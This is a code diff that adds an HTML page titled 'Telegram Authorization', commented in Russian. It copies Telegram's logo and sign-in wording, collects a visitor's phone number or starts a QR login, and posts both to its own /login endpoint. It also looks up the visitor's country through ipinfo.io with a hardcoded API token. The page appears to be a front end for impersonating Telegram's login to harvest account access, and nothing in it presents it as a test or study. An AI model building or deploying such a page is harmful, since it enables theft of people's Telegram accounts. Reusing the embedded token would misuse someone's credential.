@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Authorization</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <!-- Анимация загрузки -->
+    <div id="loading-overlay">
+        <div class="spinner">
+			<span class="loading-text">Loading</span>
+		</div>
+    </div>
+
+    <div class="container">
+        <!-- Логотип Telegram -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+        <h1>Sign in to Telegram</h1>
+        <p>Select an authentication method to sign in to Telegram. You can sign in using your phone number or by scanning a QR code.</p>
+        
+        <!-- Всплывающее окно ошибки -->
+        <div id="errorPopup" class="error-popup"></div>
+
+        <div class="btn-group">
+            <!-- Форма для авторизации по номеру телефона -->
+            <form id="phoneForm" action="/login" method="POST">
+                <input type="hidden" name="method" value="phone">
+                <div class="phone-container">
+                    <!-- Флаг страны -->
+                    <img id="countryFlag" class="country-flag" src="https://flagcdn.com/w40/us.png" alt="us">
+                    <!-- Поле ввода телефона -->
+                    <input class="input-field" id="phoneField" name="phone" type="tel" placeholder="Enter your phone number" required>
+                </div>
+                <button class="btn" type="submit">Authorization by phone number</button>
+            </form>
+            
+            <!-- Форма для авторизации через QR-код -->
+            <form id="qrForm" action="/login" method="POST">
+                <input type="hidden" name="method" value="qr">
+                <button class="btn btn-alt" type="submit">Authorization via QR code</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        console.log("Скрипт для страницы авторизации загружен.");
+
+        // Полная карта соответствия телефонных кодов и кодов стран (ISO 3166-1 alpha-2)
+        const countryCodeMap = {
+            '1': 'us',      // США и Канада
+            '7': 'ru',      // Россия и Казахстан
+            '20': 'eg',     // Египет
+            '27': 'za',     // Южно-Африканская Республика
+            '30': 'gr',     // Греция
+            '31': 'nl',     // Нидерланды
+            '32': 'be',     // Бельгия
+            '33': 'fr',     // Франция
+            '34': 'es',     // Испания
+            '36': 'hu',     // Венгрия
+            '39': 'it',     // Италия
+            '40': 'ro',     // Румыния
+            '41': 'ch',     // Швейцария
+            '43': 'at',     // Австрия
+            '44': 'gb',     // Великобритания
+            '45': 'dk',     // Дания
+            '46': 'se',     // Швеция
+            '47': 'no',     // Норвегия
+            '48': 'pl',     // Польша
+            '49': 'de',     // Германия
+            '51': 'pe',     // Перу
+            '52': 'mx',     // Мексика
+            '53': 'cu',     // Куба
+            '54': 'ar',     // Аргентина
+            '55': 'br',     // Бразилия
+            '56': 'cl',     // Чили
+            '57': 'co',     // Колумбия
+            '58': 've',     // Венесуэла
+            '60': 'my',     // Малайзия
+            '61': 'au',     // Австралия
+            '62': 'id',     // Индонезия
+            '63': 'ph',     // Филиппины
+            '64': 'nz',     // Новая Зеландия
+            '65': 'sg',     // Сингапур
+            '66': 'th',     // Таиланд
+            '81': 'jp',     // Япония
+            '82': 'kr',     // Южная Корея
+            '84': 'vn',     // Вьетнам
+            '86': 'cn',     // Китай
+            '90': 'tr',     // Турция
+            '91': 'in',     // Индия
+            '92': 'pk',     // Пакистан
+            '93': 'af',     // Афганистан
+            '94': 'lk',     // Шри-Ланка
+            '95': 'mm',     // Мьянма
+            '98': 'ir',     // Иран
+            '211': 'ss',    // Южный Судан
+            '212': 'ma',    // Марокко
+            '213': 'dz',    // Алжир
+            '216': 'tn',    // Тунис
+            '218': 'ly',    // Ливия
+            '220': 'gm',    // Гамбия
+            '221': 'sn',    // Сенегал
+            '222': 'mr',    // Мавритания
+            '223': 'ml',    // Мали
+            '224': 'gn',    // Гвинея
+            '225': 'ci',    // Кот-д’Ивуар
+            '226': 'bf',    // Буркина-Фасо
+            '227': 'ne',    // Нигер
+            '228': 'tg',    // Того
+            '229': 'bj',    // Бенин
+            '230': 'mu',    // Маврикий
+            '231': 'lr',    // Либерия
+            '232': 'sl',    // Сьерра-Леоне
+            '233': 'gh',    // Гана
+            '234': 'ng',    // Нигерия
+            '235': 'td',    // Чад
+            '236': 'cf',    // Центральноафриканская Республика
+            '237': 'cm',    // Камерун
+            '238': 'cv',    // Кабо-Верде
+            '239': 'st',    // Сан-Томе и Принсипи
+            '240': 'gq',    // Экваториальная Гвинея
+            '241': 'ga',    // Габон
+            '242': 'cg',    // Конго (Браззавиль)
+            '243': 'cd',    // Демократическая Республика Конго (Киншаса)
+            '244': 'ao',    // Ангола
+            '245': 'gw',    // Гвинея-Бисау
+            '246': 'io',    // Британская территория Индийского океана
+            '247': 'ac',    // Остров Вознесения
+            '248': 'sc',    // Сейшелы
+            '249': 'sd',    // Судан
+            '250': 'rw',    // Руанда
+            '251': 'et',    // Эфиопия
+            '252': 'so',    // Сомали
+            '253': 'dj',    // Джибути
+            '254': 'ke',    // Кения
+            '255': 'tz',    // Танзания
+            '256': 'ug',    // Уганда
+            '257': 'bi',    // Бурунди
+            '258': 'mz',    // Мозамбик
+            '260': 'zm',    // Замбия
+            '261': 'mg',    // Мадагаскар
+            '262': 're',    // Реюньон
+            '263': 'zw',    // Зимбабве
+            '264': 'na',    // Намибия
+            '265': 'mw',    // Малави
+            '266': 'ls',    // Лесото
+            '267': 'bw',    // Ботсвана
+            '268': 'sz',    // Эсватини
+            '269': 'km',    // Коморские Острова
+            '290': 'sh',    // Остров Святой Елены
+            '291': 'er',    // Эритрея
+            '297': 'aw',    // Аруба
+            '298': 'fo',    // Фарерские острова
+            '299': 'gl',    // Гренландия
+            '350': 'gi',    // Гибралтар
+            '351': 'pt',    // Португалия
+            '352': 'lu',    // Люксембург
+            '353': 'ie',    // Ирландия
+            '354': 'is',    // Исландия
+            '355': 'al',    // Албания
+            '356': 'mt',    // Мальта
+            '357': 'cy',    // Кипр
+            '358': 'fi',    // Финляндия
+            '359': 'bg',    // Болгария
+            '370': 'lt',    // Литва
+            '371': 'lv',    // Латвия
+            '372': 'ee',    // Эстония
+            '373': 'md',    // Молдова
+            '374': 'am',    // Армения
+            '375': 'by',    // Беларусь
+            '376': 'ad',    // Андорра
+            '377': 'mc',    // Монако
+            '378': 'sm',    // Сан-Марино
+            '380': 'ua',    // Украина
+            '381': 'rs',    // Сербия
+            '382': 'me',    // Черногория
+            '385': 'hr',    // Хорватия
+            '386': 'si',    // Словения
+            '387': 'ba',    // Босния и Герцеговина
+            '389': 'mk',    // Северная Македония
+            '420': 'cz',    // Чехия
+            '421': 'sk',    // Словакия
+            '423': 'li',    // Лихтенштейн
+            '500': 'fk',    // Фолклендские острова
+            '501': 'bz',    // Белиз
+            '502': 'gt',    // Гватемала
+            '503': 'sv',    // Сальвадор
+            '504': 'hn',    // Гондурас
+            '505': 'ni',    // Никарагуа
+            '506': 'cr',    // Коста-Рика
+            '507': 'pa',    // Панама
+            '508': 'pm',    // Сен-Пьер и Микелон
+            '509': 'ht',    // Гаити
+            '590': 'gp',    // Гваделупа
+            '591': 'bo',    // Боливия
+            '592': 'gy',    // Гайана
+            '593': 'ec',    // Эквадор
+            '594': 'gf',    // Французская Гвиана
+            '595': 'py',    // Парагвай
+            '596': 'mq',    // Мартиника
+            '597': 'sr',    // Суринам
+            '598': 'uy',    // Уругвай
+            '599': 'cw',    // Кюрасао
+            '670': 'tl',    // Восточный Тимор
+            '672': 'nf',    // Норфолкский остров
+            '673': 'bn',    // Бруней
+            '674': 'nr',    // Науру
+            '675': 'pg',    // Папуа-Новая Гвинея
+            '676': 'to',    // Тонга
+            '677': 'sb',    // Соломоновы Острова
+            '678': 'vu',    // Вануату
+            '679': 'fj',    // Фиджи
+            '680': 'pw',    // Палау
+            '681': 'wf',    // Уоллис и Футуна
+            '682': 'ck',    // Острова Кука
+            '683': 'nu',    // Ниуе
+            '685': 'ws',    // Самоа
+            '686': 'ki',    // Кирибати
+            '687': 'nc',    // Новая Каледония
+            '688': 'tv',    // Тувалу
+            '689': 'pf',    // Французская Полинезия
+            '690': 'tk',    // Токелау
+            '691': 'fm',    // Федеративные Штаты Микронезии
+            '692': 'mh',    // Маршалловы Острова
+            // Добавьте дополнительные коды стран по мере необходимости
+        };
+
+        // Функция для отображения сообщения об ошибке
+        function showError(message) {
+            console.log("Функция showError вызвана с сообщением:", message);
+            const errorPopup = document.getElementById('errorPopup');
+            errorPopup.innerText = message;
+            errorPopup.style.display = 'block';
+
+            // Скрываем уведомление через 4 секунды
+            setTimeout(() => {
+                errorPopup.style.display = 'none';
+            }, 4000);
+        }
+
+        // Функция для установки флага страны
+        function setCountryFlag(countryCode) {
+            const flagImg = document.getElementById('countryFlag');
+            if (countryCode) {
+                // Формируем URL к флагу из FlagCDN
+                // FlagCDN использует маленькие буквы для кода страны
+                flagImg.src = `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;
+                flagImg.alt = countryCode;
+            } else {
+                // Если код страны не определён, устанавливаем флаг по умолчанию (США)
+                flagImg.src = `https://flagcdn.com/w40/us.png`;
+                flagImg.alt = 'us';
+            }
+        }
+
+        // Функция для определения страны по введённому телефонному коду
+        function detectCountryByPhoneCode(phoneNumber) {
+            // Удаляем все символы, кроме цифр
+            const cleanedNumber = phoneNumber.replace(/\D/g, '');
+            // Проверяем длину и находим наиболее длинный подходящий код
+            for (let i = 1; i <= 3; i++) {
+                const code = cleanedNumber.substring(0, i);
+                if (countryCodeMap[code]) {
+                    return countryCodeMap[code];
+                }
+            }
+            return null; // Код не найден
+        }
+
+        // Функция для обработки ввода телефона
+        function handlePhoneInput(event) {
+            const phoneNumber = event.target.value;
+            const countryCode = detectCountryByPhoneCode(phoneNumber);
+            if (countryCode) {
+                setCountryFlag(countryCode);
+            } else {
+                setCountryFlag(null); // Устанавливаем флаг по умолчанию
+            }
+        }
+
+        // Функция для получения страны пользователя через ipinfo.io
+        function fetchUserCountry() {
+            const token = '0d927b86d5b2d8'; // Ваш токен ipinfo.io
+            fetch(`https://ipinfo.io/json?token=${token}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.country) {
+                        setCountryFlag(data.country);
+                    } else {
+                        setCountryFlag(null); // Устанавливаем флаг по умолчанию
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка при определении страны:', error);
+                    setCountryFlag(null); // Устанавливаем флаг по умолчанию при ошибке
+                });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            console.log("DOMContentLoaded событие произошло.");
+
+            // Показ ошибки, если она передана от сервера
+            const errorMessage = "";
+            console.log("Получено сообщение об ошибке:", errorMessage);
+            if (errorMessage) {
+                showError(errorMessage);
+                console.log("Показано сообщение об ошибке:", errorMessage);
+            }
+
+            // Обработчик события ввода для поля телефона
+            const phoneField = document.getElementById('phoneField');
+            if (phoneField) {
+                phoneField.addEventListener('input', handlePhoneInput);
+                console.log("Добавлен обработчик события 'input' для поля телефона.");
+            } else {
+                console.error('Поле ввода телефона не найдено.');
+            }
+
+            // Получение и установка флага страны пользователя
+            fetchUserCountry();
+
+            // Обработчик события отправки формы авторизации по номеру телефона
+            const phoneForm = document.getElementById('phoneForm');
+            if (phoneForm) {
+                phoneForm.addEventListener('submit', () => {
+                    console.log("Форма авторизации по телефону отправлена. Отображаем загрузчик.");
+                    // Отображаем загрузчик
+                    const loadingOverlay = document.getElementById('loading-overlay');
+                    loadingOverlay.classList.add('show');
+                });
+                console.log("Добавлен обработчик события 'submit' для формы авторизации по телефону.");
+            } else {
+                console.error('Форма авторизации по телефону не найдена.');
+            }
+
+            // Обработчик события отправки формы авторизации через QR-код
+            const qrForm = document.getElementById('qrForm');
+            if (qrForm) {
+                qrForm.addEventListener('submit', () => {
+                    console.log("Форма авторизации через QR-код отправлена. Отображаем загрузчик.");
+                    // Отображаем загрузчик
+                    const loadingOverlay = document.getElementById('loading-overlay');
+                    loadingOverlay.classList.add('show');
+                });
+                console.log("Добавлен обработчик события 'submit' для формы авторизации через QR-код.");
+            } else {
+                console.error('Форма авторизации через QR-код не найдена.');
+            }
+        });
+    </script>
+</body>
+</html>
